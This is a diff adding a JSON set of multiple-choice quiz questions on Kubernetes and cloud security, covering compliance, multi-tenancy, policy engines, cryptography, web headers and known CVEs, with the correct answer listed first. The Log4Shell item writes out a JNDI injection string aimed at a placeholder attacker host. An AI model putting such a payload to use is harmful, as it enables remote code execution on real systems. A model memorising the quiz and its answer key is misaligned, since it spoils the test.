+        "q": "Risk of 'Scratch' image?",
+        "o": [
+            "Missing CA certificates or timezone data unless explicitly copied in",
+            "Too large",
+            "Slow",
+            "Vulnerable"
+        ]
+    },
+    {
+        "q": "What is 'CA Bundle'?",
+        "o": [
+            "File containing trusted public root certificates (needed for HTTPS calls)",
+            "Private keys",
+            "Passwords",
+            "Logs"
+        ]
+    },
+    {
+        "q": "What is 'PCI-DSS' in K8s?",
+        "o": [
+            "Payment Card Industry Data Security Standard (applies if handling credit card data)",
+            "Health data",
+            "Gov data",
+            "Personal data"
+        ]
+    },
+    {
+        "q": "PCI requirement: 'Segmentation'?",
+        "o": [
+            "Isolating cardholder data environment (use NetworkPolicies, separate namespaces/clusters)",
+            "Sharing",
+            "Mixing",
+            "Public"
+        ]
+    },
+    {
+        "q": "What is 'HIPAA'?",
+        "o": [
+            "Health Insurance Portability and Accountability Act (protects PHI)",
+            "Payment",
+            "Card",
+            "Cloud"
+        ]
+    },
+    {
+        "q": "What is 'BAA' (Business Associate Agreement)?",
+        "o": [
+            "Contract with Cloud Provider ensuring they handle PHI compliantly (Shared Responsibility)",
+            "Bill",
+            "Invoice",
+            "Ticket"
+        ]
+    },
+    {
+        "q": "What is 'Shared Responsibility Model'?",
+        "o": [
+            "Cloud Provider secures 'of' the cloud (hardware); You secure 'in' the cloud (data, config)",
+            "Provider does all",
+            "You do all",
+            "None"
+        ]
+    },
+    {
+        "q": "What is 'Kube-hunter' Active Mode?",
+        "o": [
+            "Actively tries to exploit found vulnerabilities (dangerous in production)",
+            "Passive scan",
+            "Log check",
+            "Config check"
+        ]
+    },
+    {
+        "q": "What is 'Passive Mode' Kube-hunter?",
+        "o": [
+            "Only checks for issues without trying to change state or exploit",
+            "Active",
+            "Exploit",
+            "Attack"
+        ]
+    },
+    {
+        "q": "What is 'Trivy' vs 'Clair'?",
+        "o": [
+            "Trivy is standalone/easy CLI (scans OS+deps); Clair is server-based (usually registry integrated)",
+            "Same",
+            "Clair is CLI",
+            "Trivy is server"
+        ]
+    },
+    {
+        "q": "What is 'Grype' database?",
+        "o": [
+            "Uses a local sqlite DB updated from vulnerability sources (NVD, Alpine, RedHat)",
+            "Remote API",
+            "Cloud only",
+            "Static file"
+        ]
+    },
+    {
+        "q": "What is 'Advanced Persistent Threat' (APT)?",
+        "o": [
+            "Sophisticated, prolonged cyberattack where intruder remains undetected",
+            "Script kiddie",
+            "Botnet",
+            "Virus"
+        ]
+    },
+    {
+        "q": "What is 'Zero-Day' exploit?",
+        "o": [
+            "Attack targeting a vulnerability that is unknown to the vendor (0 days to fix)",
+            "Old bug",
+            "Fixed bug",
+            "Patched bug"
+        ]
+    },
+    {
+        "q": "How to defend against Zero-Day?",
+        "o": [
+            "Defense in Depth (limit blast radius, isolation, monitoring) since signature detection fails",
+            "Patching",
+            "Updating",
+            "Ignoring"
+        ]
+    },
+    {
+        "q": "What is 'Pod Security Standards' (PSS)?",
+        "o": [
+            "Formal set of policies (Privileged, Baseline, Restricted) defined by K8s project",
+            "Tool",
+            "Controller",
+            "Plugin"
+        ]
+    },
+    {
+        "q": "What is 'AppArmor' profile mode 'enforce'?",
+        "o": [
+            "Blocks actions violating the profile and logs them",
+            "Complain",
+            "Audit",
+            "Ignore"
+        ]
+    },
+    {
+        "q": "What is 'AppArmor' profile mode 'complain'?",
+        "o": [
+            "Logs violations but allows the action (good for learning phase)",
+            "Enforce",
+            "Block",
+            "Stop"
+        ]
+    },
+    {
+        "q": "Where are AppArmor profiles stored?",
+        "o": [
+            "On the Node (host filesystem) usually /etc/apparmor.d/",
+            "In Etcd",
+            "In API",
+            "In Registry"
+        ]
+    },
+    {
+        "q": "How to apply AppArmor to Pod?",
+        "o": [
+            "Annotation container.apparmor.security.beta.kubernetes.io/<container_name>",
+            "Label",
+            "Env var",
+            "Volume"
+        ]
+    },
+    {
+        "q": "What is 'SELinux' Type Enforcement?",
+        "o": [
+            "Validating that a process type (domain) has permission to access a file type",
+            "User check",
+            "Group check",
+            "Owner check"
+        ]
+    },
+    {
+        "q": "What is 'Multi-Tenancy'?",
+        "o": [
+            "Running workloads from multiple distinct users/teams on the same cluster",
+            "Single user",
+            "Dedicated",
+            "Private"
+        ]
+    },
+    {
+        "q": "What is 'Soft Multi-Tenancy'?",
+        "o": [
+            "Tenants trust each other somewhat (e.g. same company teams); uses Namespaces/RBAC",
+            "Hard",
+            "Hostile",
+            "Isolated"
+        ]
+    },
+    {
+        "q": "What is 'Hard Multi-Tenancy'?",
+        "o": [
+            "Tenants do not trust each other (e.g. SaaS); requires strict isolation (Sandboxing, NetPolicies)",
+            "Soft",
+            "Trust",
+            "Open"
+        ]
+    },
+    {
+        "q": "What is 'vCluster' (Virtual Cluster)?",
+        "o": [
+            "Running a full K8s control plane inside a namespace of a host cluster (Hard Multi-tenancy)",
+            "Namespace",
+            "Pod",
+            "Node"
+        ]
+    },
+    {
+        "q": "Benefit of vCluster?",
+        "o": [
+            "Tenants get full admin access (CRDs, namespaces) without affecting host cluster",
+            "None",
+            "Complexity",
+            "Cost"
+        ]
+    },
+    {
+        "q": "What is 'Capsule'?",
+        "o": [
+            "Multi-tenancy operator providing 'Tenant' CRD to group namespaces and enforce quotas",
+            "Container",
+            "Pod",
+            "Node"
+        ]
+    },
+    {
+        "q": "What is 'HNC' (Hierarchical Namespace Controller)?",
+        "o": [
+            "Allows organizing namespaces in a hierarchy (parent/child) with policy/quota propagation",
+            "Flat",
+            "List",
+            "Array"
+        ]
+    },
+    {
+        "q": "What is 'ResourceQuota' security role?",
+        "o": [
+            "Prevents a compromised or buggy tenant from consuming all cluster resources (DoS)",
+            "Access control",
+            "Logging",
+            "Auditing"
+        ]
+    },
+    {
+        "q": "What is 'LimitRange'?",
+        "o": [
+            "Enforces default/min/max request/limits for pods in a namespace (prevents tiny/huge pods)",
+            "Disk limit",
+            "Net limit",
+            "Time limit"
+        ]
+    },
+    {
+        "q": "What is 'PriorityClass'?",
+        "o": [
+            "Indicates importance of a Pod; higher priority pods can preempt (evict) lower ones",
+            "Label",
+            "Taint",
+            "Score"
+        ]
+    },
+    {
+        "q": "Security risk of high PriorityClass?",
+        "o": [
+            "Malicious user could set high priority to starve system components (needs RBAC restriction on PriorityClass)",
+            "None",
+            "Better performance",
+            "Fast scheduling"
+        ]
+    },
+    {
+        "q": "What is 'Node Authorization'?",
+        "o": [
+            "Special authorization mode for Kubelets (authorizes API requests from nodes)",
+            "User auth",
+            "Admin auth",
+            "Token auth"
+        ]
+    },
+    {
+        "q": "What is 'Certificate Rotation'?",
+        "o": [
+            "Refreshing certificates before they expire to maintain trust and encryption",
+            "Deleting",
+            "Revoking",
+            "Ignoring"
+        ]
+    },
+    {
+        "q": "What handles Kubelet cert rotation?",
+        "o": [
+            "Kubelet can auto-request new certs via CSR API when nearing expiration",
+            "Manual",
+            "Admin",
+            "Script"
+        ]
+    },
+    {
+        "q": "What is 'CSR'?",
+        "o": [
+            "Certificate Signing Request (sending public key and subject to CA for signing)",
+            "Key",
+            "Token",
+            "Password"
+        ]
+    },
+    {
+        "q": "Who approves Kubelet CSRs?",
+        "o": [
+            "Controller Manager (csrapproving controller) or manual administrator",
+            "API Server",
+            "Etcd",
+            "Scheduler"
+        ]
+    },
+    {
+        "q": "What is 'Tiller' (Helm 2) risk?",
+        "o": [
+            "Ran as cluster-admin daemon; anyone who could talk to Tiller got root (Removed in Helm 3)",
+            "Safe",
+            "Secure",
+            "Good"
+        ]
+    },
+    {
+        "q": "Helm 3 security improvement?",
+        "o": [
+            "Client-only (no Tiller); uses the user's kubeconfig credentials (RBAC compliant)",
+            "Tiller 2",
+            "Root daemon",
+            "Open port"
+        ]
+    },
+    {
+        "q": "What is 'Helm Provenance'?",
+        "o": [
+            "Signing Helm charts with PGP to ensure integrity and origin",
+            "Zip",
+            "Tar",
+            "Copy"
+        ]
+    },
+    {
+        "q": "What is 'Kaniko' security?",
+        "o": [
+            "Builds images inside a container without needing Docker daemon (rootless capability)",
+            "Requires root",
+            "Needs daemon",
+            "Insecure"
+        ]
+    },
+    {
+        "q": "What is 'Buildah'?",
+        "o": [
+            "Tool for building OCI images; designed to work well rootless",
+            "Docker",
+            "Moby",
+            "Runc"
+        ]
+    },
+    {
+        "q": "What is 'Podman'?",
+        "o": [
+            "Daemonless container engine (compatible with Docker CLI) supporting rootless containers by default",
+            "Docker",
+            "K8s",
+            "Containerd"
+        ]
+    },
+    {
+        "q": "What is 'GPG' key?",
+        "o": [
+            "GNU Privacy Guard encryption key used for signing commits/tags/artifacts",
+            "SSH key",
+            "API key",
+            "Password"
+        ]
+    },
+    {
+        "q": "Why sign Git commits?",
+        "o": [
+            "Provenance; verifies that the commit actually came from the claimed author",
+            "Encryption",
+            "Performance",
+            "Storage"
+        ]
+    },
+    {
+        "q": "What is 'Binary Authorization' (GCP)?",
+        "o": [
+            "Deploy-time security control attempting to ensure only trusted images are deployed",
+            "Runtime check",
+            "Network check",
+            "Code check"
+        ]
+    },
+    {
+        "q": "What is 'K-Rail'?",
+        "o": [
+            "Workload policy enforcement tool (Validating Webhook) for K8s security ops",
+            "Train",
+            "Track",
+            "Line"
+        ]
+    },
+    {
+        "q": "What is 'Polaris'?",
+        "o": [
+            "Dashboard and validation tool for K8s best practices (security, efficiency, reliability)",
+            "Star",
+            "Map",
+            "GPS"
+        ]
+    },
+    {
+        "q": "What is 'Checkov'?",
+        "o": [
+            "Static code analysis tool for IaC (Terraform, K8s, Helm) scanning for misconfigs",
+            "Checker",
+            "Tester",
+            "Scanner"
+        ]
+    },
+    {
+        "q": "What is 'Terrascan'?",
+        "o": [
+            "Static code analyzer for IaC security (by Tenable)",
+            "Scanner",
+            "Tool",
+            "App"
+        ]
+    },
+    {
+        "q": "What is 'kube-score'?",
+        "o": [
+            "Tool that performs static analysis of Kubernetes object definitions",
+            "Game",
+            "Points",
+            "Rank"
+        ]
+    },
+    {
+        "q": "What is 'popeye'?",
+        "o": [
+            "K8s sanitiizer; scans cluster for potential issues with resources and configs",
+            "Sailor",
+            "Man",
+            "Spinach"
+        ]
+    },
+    {
+        "q": "What is 'Snyk'?",
+        "o": [
+            "Developer security platform (scans code, deps, containers, IaC)",
+            "Snake",
+            "Sneak",
+            "Snack"
+        ]
+    },
+    {
+        "q": "What is 'Github Advanced Security'?",
+        "o": [
+            "Feature suite (CodeQL, Secret Scanning, Dependency Review) in GitHub",
+            "Basic",
+            "Free",
+            "Open"
+        ]
+    },
+    {
+        "q": "What is 'CodeQL'?",
+        "o": [
+            "Query language for code analysis (semantic code search) found in GitHub Actions",
+            "SQL",
+            "NoSQL",
+            "Graph"
+        ]
+    },
+    {
+        "q": "What is 'Secret Scanning' (GitHub)?",
+        "o": [
+            "Detects secrets (tokens/keys) accidentally pushed to repos and alerts/revokes them",
+            "Virus scan",
+            "Malware scan",
+            "Bug scan"
+        ]
+    },
+    {
+        "q": "What is 'Dependabot'?",
+        "o": [
+            "Automated dependency update tool (creates PRs for outdated/vulnerable libs)",
+            "Bot",
+            "Robot",
+            "Script"
+        ]
+    },
+    {
+        "q": "What is 'Renovate'?",
+        "o": [
+            "Universal dependency update tool (highly configurable alternative to Dependabot)",
+            "Repair",
+            "Fix",
+            "Build"
+        ]
+    },
+    {
+        "q": "What is 'Hash' verification?",
+        "o": [
+            "Checking SHA checksum of a downloaded binary against known good value to ensure integrity",
+            "Size check",
+            "Name check",
+            "Date check"
+        ]
+    },
+    {
+        "q": "What is 'Checksum'?",
+        "o": [
+            "A small-sized datum derived from a block of digital data for detecting errors",
+            "Sum",
+            "Total",
+            "Count"
+        ]
+    },
+    {
+        "q": "What is 'SHA-256'?",
+        "o": [
+            "Cryptographic hash function producing a 256-bit hash (common for container IDs)",
+            "MD5",
+            "SHA1",
+            "CRC32"
+        ]
+    },
+    {
+        "q": "Why is MD5 deprecated?",
+        "o": [
+            "Vulnerable to collision attacks (two different inputs producing same hash)",
+            "Slow",
+            "Large",
+            "Complex"
+        ]
+    },
+    {
+        "q": "What is 'Collision Attack'?",
+        "o": [
+            "Finding two distinct messages that hash to the same value",
+            "Crash",
+            "Bump",
+            "Hit"
+        ]
+    },
+    {
+        "q": "What is 'Pre-image attack'?",
+        "o": [
+            "Finding a message that has a specific hash value",
+            "Image attack",
+            "Picture attack",
+            "View attack"
+        ]
+    },
+    {
+        "q": "What is 'Salt' in hashing?",
+        "o": [
+            "Random data added to input to ensure unique hash even for same password",
+            "Sugar",
+            "Pepper",
+            "Spice"
+        ]
+    },
+    {
+        "q": "What is 'Argon2'?",
+        "o": [
+            "Modern key derivation function (password hashing algorithm) winner of PHC",
+            "Gas",
+            "Element",
+            "Noble"
+        ]
+    },
+    {
+        "q": "What is 'Bcrypt'?",
+        "o": [
+            "Password hashing function (based on Blowfish) with work factor (slow by design)",
+            "Encrypt",
+            "Decrypt",
+            "Cipher"
+        ]
+    },
+    {
+        "q": "Why slow password hashing?",
+        "o": [
+            "To defend against brute-force and rainbow table attacks",
+            "Annoy users",
+            "Save cpu",
+            "Save disk"
+        ]
+    },
+    {
+        "q": "What is 'Rainbow Table'?",
+        "o": [
+            "Precomputed table for reversing cryptographic hash functions (time-memory tradeoff)",
+            "Colors",
+            "Chart",
+            "List"
+        ]
+    },
+    {
+        "q": "What is 'SSH Tunnel'?",
+        "o": [
+            "Encrypted tunnel created through SSH protocol (port forwarding)",
+            "VPN",
+            "Direct",
+            "Wire"
+        ]
+    },
+    {
+        "q": "What is 'Port Forwarding'?",
+        "o": [
+            "Redirecting a communication request from one address/port to another",
+            "Routing",
+            "Switching",
+            "Bridging"
+        ]
+    },
+    {
+        "q": "What is 'mTLS' (Mutual TLS)?",
+        "o": [
+            "Protocol where both client and server authenticate each other with certificates",
+            "TLS",
+            "SSL",
+            "HTTPS"
+        ]
+    },
+    {
+        "q": "What is 'One-way TLS'?",
+        "o": [
+            "Only the server is authenticated (standard HTTPS)",
+            "Two-way",
+            "Mutual",
+            "Full"
+        ]
+    },
+    {
+        "q": "What is 'Cipher Suite'?",
+        "o": [
+            "Set of algorithms (Key Exchange, Auth, Encryption, MAC) used for TLS connection",
+            "Suite",
+            "Room",
+            "Set"
+        ]
+    },
+    {
+        "q": "What is 'Forward Secrecy'?",
+        "o": [
+            "Property ensuring that compromise of long-term keys does not compromise past session keys",
+            "Backward secrecy",
+            "Future secrecy",
+            "Current secrecy"
+        ]
+    },
+    {
+        "q": "What is 'TLS 1.3' improvement?",
+        "o": [
+            "Faster handshake, removed insecure ciphers, mandatory forward secrecy",
+            "Slower",
+            "More ciphers",
+            "Older"
+        ]
+    },
+    {
+        "q": "What is 'SNI' (Server Name Indication)?",
+        "o": [
+            "Extension allowing client to specify hostname during handshake (hosting multiple certs on one IP)",
+            "IP",
+            "Port",
+            "Protocol"
+        ]
+    },
+    {
+        "q": "What is 'HSTS'?",
+        "o": [
+            "HTTP Strict Transport Security (header forcing browser to use HTTPS)",
+            "HTTP",
+            "HTML",
+            "Header"
+        ]
+    },
+    {
+        "q": "What is 'CSP' (Content Security Policy)?",
+        "o": [
+            "HTTP header preventing XSS by restricting sources of executable scripts",
+            "ISP",
+            "DSP",
+            "MSP"
+        ]
+    },
+    {
+        "q": "What is 'Clickjacking'?",
+        "o": [
+            "Trickind a user into clicking something different from what they perceive (iframe overlay)",
+            "Phishing",
+            "Spoofing",
+            "Hacking"
+        ]
+    },
+    {
+        "q": "How to prevent Clickjacking?",
+        "o": [
+            "X-Frame-Options header (DENY or SAMEORIGIN)",
+            "CSP",
+            "HSTS",
+            "CORS"
+        ]
+    },
+    {
+        "q": "What is 'CORS'?",
+        "o": [
+            "Cross-Origin Resource Sharing (mechanism allowing resources to be requested from another domain)",
+            "CSP",
+            "XSS",
+            "CSRF"
+        ]
+    },
+    {
+        "q": "What is 'Zero Trust' architecture?",
+        "o": [
+            "Security model assuming no user or device is trustworthy by default, regardless of location",
+            "Trust internal",
+            "Trust external",
+            "Trust VPN"
+        ]
+    },
+    {
+        "q": "Core principle of Zero Trust?",
+        "o": [
+            "Verify explicitly, use least privilege, assume breach",
+            "Trust but verify",
+            "Block all",
+            "Allow all"
+        ]
+    },
+    {
+        "q": "What is 'OPA' (Open Policy Agent)?",
+        "o": [
+            "General-purpose policy engine that decouples policy decision-making from policy enforcement",
+            "Firewall",
+            "Router",
+            "Switch"
+        ]
+    },
+    {
+        "q": "What is 'Rego'?",
+        "o": [
+            "Declarative query language used by OPA to define policies",
+            "Python",
+            "Java",
+            "Go"
+        ]
+    },
+    {
+        "q": "What is 'Gatekeeper'?",
+        "o": [
+            "Policy controller for K8s that integrates OPA as an Admission Controller",
+            "Door",
+            "Lock",
+            "Key"
+        ]
+    },
+    {
+        "q": "What is 'ConstraintTemplate'?",
+        "o": [
+            "CRD in Gatekeeper defining the Rego logic and schema for a policy",
+            "Rule",
+            "Law",
+            "Order"
+        ]
+    },
+    {
+        "q": "What is 'Constraint' in Gatekeeper?",
+        "o": [
+            "Instance of a template that applies the policy to specific resources (with parameters)",
+            "Template",
+            "Code",
+            "Script"
+        ]
+    },
+    {
+        "q": "In Rego, what is 'input'?",
+        "o": [
+            "Global variable representing the JSON object (e.g. AdmissionReview) being evaluated",
+            "Output",
+            "Error",
+            "Log"
+        ]
+    },
+    {
+        "q": "In Rego, what is 'msg'?",
+        "o": [
+            "Common variable name for the error message returned when a policy is violated",
+            "Data",
+            "Info",
+            "Code"
+        ]
+    },
+    {
+        "q": "What is 'Kyverno'?",
+        "o": [
+            "K8s-native policy engine using YAML resources instead of a custom language like Rego",
+            "OPA",
+            "Gatekeeper",
+            "Falco"
+        ]
+    },
+    {
+        "q": "Advantage of Kyverno vs OPA?",
+        "o": [
+            "Easier to learn for K8s users (YAML) and supports mutation/validation/generation natively",
+            "Faster",
+            "Smaller",
+            "Older"
+        ]
+    },
+    {
+        "q": "What is 'Tetragon'?",
+        "o": [
+            "eBPF-based security observability and runtime enforcement tool (by Cilium/Isovalent)",
+            "Hexagon",
+            "Polygon",
+            "Shape"
+        ]
+    },
+    {
+        "q": "What is 'Falco'?",
+        "o": [
+            "Cloud-native runtime security tool (CNCF) that detects anomalous behavior using syscalls",
+            "Hawk",
+            "Eagle",
+            "Bird"
+        ]
+    },
+    {
+        "q": "Where are Falco rules stored?",
+        "o": [
+            "Usually in /etc/falco/falco_rules.yaml or configured via Helm",
+            "/tmp",
+            "/var",
+            "/home"
+        ]
+    },
+    {
+        "q": "How does Falco output alerts?",
+        "o": [
+            "To files, syslog, stdout, or via 'Falcosidekick' to Chat/Slack/Metrics",
+            "Email only",
+            "SMS only",
+            "Print only"
+        ]
+    },
+    {
+        "q": "What is 'Istio Sidecar Injection'?",
+        "o": [
+            "Mutating Webhook that adds the Envoy proxy container to Pods automatically",
+            "Manual add",
+            "Copy paste",
+            "Script"
+        ]
+    },
+    {
+        "q": "How to enable auto-injection?",
+        "o": [
+            "Label namespace with istio-injection=enabled",
+            "Annotation",
+            "ConfigMap",
+            "Secret"
+        ]
+    },
+    {
+        "q": "What is 'SPIFFE'?",
+        "o": [
+            "Secure Production Identity Framework For Everyone (standard for workload identity)",
+            "Tool",
+            "App",
+            "Code"
+        ]
+    },
+    {
+        "q": "What is 'SPIRE'?",
+        "o": [
+            "SPIFFE Runtime Environment (implementation of the SPIFFE standards)",
+            "Tower",
+            "Peak",
+            "Top"
+        ]
+    },
+    {
+        "q": "What is 'SVID'?",
+        "o": [
+            "SPIFFE Verifiable Identity Document (usually X.509 cert or JWT) identifying a workload",
+            "ID card",
+            "Passport",
+            "Visa"
+        ]
+    },
+    {
+        "q": "What is 'Workload Attestation'?",
+        "o": [
+            "Process of verifying the identity of a running workload before issuing it an SVID",
+            "Check",
+            "Audit",
+            "Scan"
+        ]
+    },
+    {
+        "q": "What is 'Log4Shell' (CVE-2021-44228)?",
+        "o": [
+            "Critical vulnerability in Log4j allowing RCE via JNDI injection",
+            "Virus",
+            "Worm",
+            "Bug"
+        ]
+    },
+    {
+        "q": "Mechanism of Log4Shell?",
+        "o": [
+            "Attacker forces app to log a string like ${jndi:ldap://evil.com/x} triggering remote code load",
+            "SQLi",
+            "XSS",
+            "CSRF"
+        ]
+    },
+    {
+        "q": "Mitigation for Log4Shell?",
+        "o": [
+            "Upgrade Log4j, remove JndiLookup class, or use WAF rules/environment variables to disable JNDI",
+            "Restart",
+            "Reboot",
+            "Ignore"
+        ]
+    },
+    {
+        "q": "What is 'Dirty Pipe' (CVE-2022-0847)?",
+        "o": [
+            "Linux kernel vulnerability allowing unprivileged users to overwrite read-only files (escalation)",
+            "Clean pipe",
+            "Broken pipe",
+            "Leaky pipe"
+        ]
+    },
+    {
+        "q": "What is 'TOCTOU'?",
+        "o": [
+            "Time of Check to Time of Use (race condition bug)",
+            "Tick Tock",
+            "Time out",
+            "Timer"
+        ]
+    },
+    {
+        "q": "What is 'Symlink Race'?",
+        "o": [
+            "Exploiting the gap between checking a file and opening it by swapping it with a symlink",
+            "Run",
+            "Jog",
+            "Sprint"
+        ]
+    },
+    {
+        "q": "What is 'SIEM'?",
+        "o": [
+            "Security Information and Event Management (centralizing logs/alerts for analysis)",
+            "Log tool",
+            "Scan tool",
+            "Hack tool"
+        ]
+    },
+    {
+        "q": "What is 'Audit Policy'?",
+        "o": [
+            "Rules defining what events generated by K8s API server should be recorded and how much detail",
+            "Log rule",
+            "File rule",
+            "Net rule"
+        ]
+    },
+    {
+        "q": "Audit Level: 'Metadata'?",
+        "o": [
+            "Logs user, timestamp, resource, verb, but NOT the request/response body",
+            "None",
+            "Request",
+            "RequestResponse"
+        ]
+    },
+    {
+        "q": "Audit Level: 'RequestResponse'?",
+        "o": [
+            "Logs everything including the full body of request and response (high volume!)",
+            "Metadata",
+            "None",
+            "Request"
+        ]
+    },
+    {
+        "q": "What is 'Least Privilege'?",
+        "o": [
+            "Granting only the minimum permissions necessary to perform a function",
+            "Most privilege",
+            "Admin access",
+            "Root access"
+        ]
+    },
+    {
+        "q": "What is 'Separation of Duties'?",
+        "o": [
+            "Ensuring no single person has total control (e.g. dev cannot deploy to prod without approval)",
+            "Combining",
+            "Mixing",
+            "Merging"
+        ]
+    },
+    {
+        "q": "What is 'Defense in Depth'?",
+        "o": [
+            "Layered security approach (Network + Host + App + Data container) so one failure isn't fatal",
+            "Single layer",
+            "No layer",
+            "Flat"
+        ]
+    },
+    {
+        "q": "What is 'Attack Surface'?",
+        "o": [
+            "The sum of all possible points where an unauthorized user can try to enter/extract data",
+            "Area",
+            "Volume",
+            "Size"
+        ]
+    },
+    {
+        "q": "What is 'Threat Modeling'?",
+        "o": [
+            "Structured process of identifying potential threats and vulnerabilities",
+            "Drawing",
+            "Sketching",
+            "Painting"
+        ]
+    },
+    {
+        "q": "What is 'STRIDE' model?",
+        "o": [
+            "Spoofing, Tampering, Repudiation, Information Disclosure, Denial of Service, Elevation of Privilege",
+            "WALK",
+            "RUN",
+            "JUMP"
+        ]
+    },
+    {
+        "q": "What is 'MITRE ATT&CK'?",
+        "o": [
+            "Global knowledge base of adversary tactics and techniques aimed at real-world observations",
+            "Game",
+            "Show",
+            "Movie"
+        ]
+    },
+    {
+        "q": "MITRE Technique: 'Initial Access'?",
+        "o": [
+            "How the attacker gets into the network (Phishing, Exploit Public App)",
+            "Escalation",
+            "Impact",
+            "Discovery"
+        ]
+    },
+    {
+        "q": "MITRE Technique: 'Lateral Movement'?",
+        "o": [
+            "Moving through the environment to find the target (SSH hijacking, Pass the Hash)",
+            "Vertical",
+            "Diagonal",
+            "Static"
+        ]
+    },
+    {
+        "q": "MITRE Technique: 'Exfiltration'?",
+        "o": [
+            "Stealing data from the network (Transfer to cloud account, Encrypted channel)",
+            "Access",
+            "Delete",
+            "Modify"
+        ]
+    },
+    {
+        "q": "Risk of 'chmod 777'?",
+        "o": [
+            "Readable, Writable, and Executable by EVERYONE (User, Group, Others)",
+            "Safe",
+            "Fast",
+            "Good"
+        ]
+    },
+    {
+        "q": "What is 'SetUID' bit (4000)?",
+        "o": [
+            "Allows a user to run an executable with the permissions of the file owner (often root)",
+            "SetGID",
+            "Sticky",
+            "Read"
+        ]
+    },
+    {
+        "q": "What is 'Sticky Bit' (1000)?",
+        "o": [
+            "On directories, prevents users from deleting files owned by others (used in /tmp)",
+            "Glue",
+            "Tape",
+            "Seal"
+        ]
+    },
+    {
+        "q": "What is '/etc/shadow'?",
+        "o": [
+            "File storing encrypted password hashes and aging info (readable only by root)",
+            "Passwords",
+            "Users",
+            "Groups"
+        ]
+    },
+    {
+        "q": "What is '/var/run/docker.sock'?",
+        "o": [
+            "Unix socket for communicating with Docker Daemon (giving access = giving root)",
+            "File",
+            "Dir",
+            "Log"
+        ]
+    },
+    {
+        "q": "What is 'Rootless Docker'?",
+        "o": [
+            "Running Docker daemon and containers as a non-root user (using user namespaces)",
+            "Root",
+            "Sudo",
+            "Admin"
+        ]
+    },
+    {
+        "q": "What is 'slirp4netns'?",
+        "o": [
+            "User-mode networking utility used by Rootless Docker/Podman",
+            "Driver",
+            "Kernel",
+            "Module"
+        ]
+    },
+    {
+        "q": "What is 'External Secrets Operator' (ESO)?",
+        "o": [
+            "Syncs secrets from external APIs (AWS, Azure, Vault) into K8s Secrets",
+            "Internal",
+            "Local",
+            "Static"
+        ]
+    },
+    {
+        "q": "What is 'Sealed Secrets'?",
+        "o": [
+            "Encrypts secrets into a 'SealedSecret' CRD that can be safely stored in Git",
+            "Open secrets",
+            "Public secrets",
+            "Plain secrets"
+        ]
+    },
+    {
+        "q": "What matches the 'SealedSecret'?",
+        "o": [
+            "Only the controller in the cluster (with private key) can decrypt it",
+            "Anyone",
+            "User",
+            "Dev"
+        ]
+    },
+    {
+        "q": "What is 'Encryption at Rest' (K8s)?",
+        "o": [
+            "Encrypting secret data stored in etcd so direct disk access doesn't reveal keys",
+            "Transit",
+            "Flight",
+            "Use"
+        ]
+    },
+    {
+        "q": "What is 'KMS Provider'?",
+        "o": [
+            "Plugin allowing K8s to use an external Key Management Service (AWS KMS, CloudKMS) for envelope encryption",
+            "Local",
+            "File",
+            "None"
+        ]
+    },
+    {
+        "q": "What is 'SSO'?",
+        "o": [
+            "Single Sign-On (user logs in once and gains access to multiple systems)",
+            "Multi log",
+            "Many log",
+            "Repeated log"
+        ]
+    },
+    {
+        "q": "What is 'MFA'?",
+        "o": [
+            "Multi-Factor Authentication (requiring 2+ verifications: know, have, are)",
+            "Single",
+            "One",
+            "None"
+        ]
+    },
+    {
+        "q": "What is 'Phishing'?",
+        "o": [
+            "Fraudulent attempt to obtain sensitive info by disguising as a trustworthy entity",
+            "Fishing",
+            "Hunting",
+            "Trapping"
+        ]
+    },
+    {
+        "q": "What is 'Social Engineering'?",
+        "o": [
+            "Manipulating people into performing actions or divulging confidential information",
+            "Coding",
+            "Hacking",
+            "Scripting"
+        ]
+    },
+    {
+        "q": "Security is...?",
+        "o": [
+            "A continuous process, not a product or destination",
+            "A tool",
+            "A software",
+            "Done"
+        ]
+    }
+]
